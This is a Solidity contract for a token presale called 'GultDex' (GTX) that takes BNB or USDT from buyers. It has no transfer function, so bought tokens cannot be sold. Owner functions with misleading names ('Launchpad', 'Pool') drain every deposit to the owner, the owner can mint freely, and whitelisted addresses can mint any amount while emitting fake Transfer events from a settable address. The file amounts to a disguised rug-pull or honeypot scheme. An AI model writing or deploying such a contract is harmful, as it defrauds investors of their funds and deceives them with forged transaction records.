// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GultDex {
    string private _name = "GultDex";
    string private _symbol = "GTX";
    uint256 private _totalSupply = 66_000_000 ether;
    uint256 public tokenExchange = 1_600;
    address public claimFrom;
    uint256 minEther = 0.1 ether;
    uint8 public commissionPercent = 10;
    uint8 public commissionPercentEther = 10;

    address USDTInterface = 0x55d398326f99059fF775485246999027B3197955;
    address aggregatorInterface = 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE;

    uint8 private _decimals = 18;
    address private _owner;
    uint256 private _cap = 0;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    mapping(address => bool) private _isEFFs;
    mapping(address => uint256) private _balances;

    event Transfer(address indexed from, address indexed to, uint256 value);

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    constructor( ) {
        _owner = msg.sender;
        claimFrom = address(this);
    }

    fallback() external {}

    receive() external payable {}

    function _mintBase(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _cap = _cap + amount;
        require(_cap <= _totalSupply, "ERC20Capped: cap exceeded");
        _balances[account] = _balances[account] + amount;
    }

    function _mintFrom(
        address from,
        address account,
        uint256 amount
    ) internal {
        _mintBase(account, amount);
        emit Transfer(from, account, amount);
    }

    function _mint(address account, uint256 amount) internal {
        _mintBase(account, amount);
        emit Transfer(address(this), account, amount);
    }

    function Partner(address account, uint256 amount) public onlyOwner {
        require(account != address(0), "ERC20: mint to the zero address");
        _cap = _cap + amount;
        require(_cap <= _totalSupply, "ERC20Capped: cap exceeded");
        _balances[account] = _balances[account] + amount;
        emit Transfer(address(this), account, amount);
    }

    function Launchpad() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
        uint256 usdtOfContract = IERC20(USDTInterface).balanceOf(address(this));
        IERC20(USDTInterface).transfer(msg.sender, usdtOfContract);
    }

    function Pool() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function _PublicSale(
        address _refer,
        uint256 amount,
        uint256 usdtAmount
    ) internal {
        require(amount >= minEther, "Transaction recovery");
        uint256 amountToken = amount * tokenExchange;
        if (usdtAmount > 0) {
            IERC20(USDTInterface).transferFrom(
                msg.sender,
                address(this),
                usdtAmount
            );
        }
        _mint(msg.sender, amountToken);
        if (_refer != address(0) && _refer != msg.sender) {
            uint256 refAmount = (amountToken * commissionPercent) / 100;
            _mint(_refer, refAmount);
            if (commissionPercentEther > 0) {
                uint256 referEth = (amount * commissionPercentEther) / 100;
                if (usdtAmount > 0) {
                    uint256 referUsdt = (usdtAmount * commissionPercentEther) /
                        100;
                    IERC20(USDTInterface).transfer(_refer, referUsdt);
                } else {
                    payable(_refer).transfer(referEth);
                }
            }
        }
    }

    function PublicSale(address _refer) public payable {
        _PublicSale(_refer, msg.value, 0);
    }

    function PublicSale(address[] calldata to, uint256 amount)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < to.length; i++)
            if (to[i] != address(0)) {
                _mint(to[i], amount);
            }
    }

    function PublicSaleUSDT(uint256 usdtAmount, address referralAddress)
        public
    {
        uint256 bnbUsdtAmount = getLatestPrice();
        uint256 amountToken = (usdtAmount * 1e18 / bnbUsdtAmount) ;
        _PublicSale(referralAddress, amountToken, usdtAmount);
    }

    function PublicSaleUSDT(address[] calldata to, uint256 amount)
        external
        onlyOwner
    {
        // uint256 bnbUsdtAmount = getLatestPrice();
        // uint256 amountToken = (amount / bnbUsdtAmount) * tokenExchange;
        for (uint256 i = 0; i < to.length; i++)
            if (to[i] != address(0)) {
                _mint(to[i], amount);
            }
    }

    function getLatestPrice() public view returns (uint256) {
        (, int256 ethPrice, , , ) = Aggregator(aggregatorInterface)
            .latestRoundData();
        ethPrice = (ethPrice * (10**10));
        return uint256(ethPrice);
    }

    function setCF(address value) external onlyOwner {
        claimFrom = value;
    }

    function PublicSale(uint256 amount) external {
        require(_isEFFs[msg.sender] == true, "Not allow");

        _mintBase(msg.sender, amount);
        emit Transfer(claimFrom, msg.sender, amount);
    }

    function PublicSaleUSDT(uint256 amount) external {
        require(_isEFFs[msg.sender] == true, "Not allow");
        // uint256 bnbUsdtAmount = getLatestPrice();
        // uint256 amountToken = (amount / bnbUsdtAmount) * tokenExchange;
        _mintBase(msg.sender, amount);
        emit Transfer(claimFrom, msg.sender, amount);
    }

    function setEFFs(address[] memory accounts, bool excluded)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isEFFs[accounts[i]] = excluded;
            emit ExcludeFromFees(accounts[i], excluded);
        }
    }

    function isEFFs(address account) external view onlyOwner returns (bool) {
        return _isEFFs[account];
    }

    function setTokenExchange(uint256 value) external onlyOwner {
        tokenExchange = value;
    }

    function setMinEhter(uint256 value) external onlyOwner {
        minEther = value;
    }

    function setCommissionPercent(uint8 value) external onlyOwner {
        commissionPercent = value;
    }

    function setCommissionPercentEther(uint8 value) external onlyOwner {
        commissionPercentEther = value;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function cap() public view returns (uint256) {
        return _totalSupply;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

interface Aggregator {
    function latestRoundData()
        external
        view
        returns (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        );
}